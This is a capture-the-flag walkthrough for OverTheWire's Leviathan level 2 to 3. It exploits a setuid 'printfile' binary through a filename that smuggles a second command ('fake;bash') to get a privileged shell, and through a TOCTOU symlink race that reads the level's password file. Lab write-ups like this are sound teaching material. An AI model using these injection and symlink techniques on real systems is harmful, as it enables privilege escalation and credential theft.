## Level 2 to 3

Login to Leviathan2:
```bash
sshpass -p $(cat leviathan2) ssh -p 2223 leviathan2@leviathan.labs.overthewire.org
```

You'll find *printfile* executable with setuid and executing just reads the file but not ```/etc/leviathan_pass/leviathan3```

---

## Method 1: Code Injection

Create a fake file attach it to command using **;** and have the *printfile* execute it

```bash
mktemp -d
touch 'fake;bash'
```

Upon executing ```printfile``` on ```fake;bash```, 'fake' is executed first and then bash is executed.\
Since the whole thing is running as user *leviathan3* the bash gets executed as leviathan3.

```bash
~/printfile 'fake;bash'
```
```bash
leviathan3@leviathan:$ cat /etc/leviathan_pass/leviathan3
```

Save the password to file *leviathan3*

At last ```exit``` and ```logout```

---

## Method 2: TOCTOU

Time to Check, Time to use\
using symboliclink

Logic is create a file, link it to cat the leviathan3 password file and create another file with a space to be ececuted along with *printfile* such that the access check is passed and the first part of file name is executed which is actually the symlink to get the lev3 password.

```bash
ln -s /etc/leviathan_pass/leviathan3 /tmp/tmpxx/test
touch "test 2"
~/printfile "test 2"
```

Save the password to file *leviathan3*

At last ```exit``` and ```logout```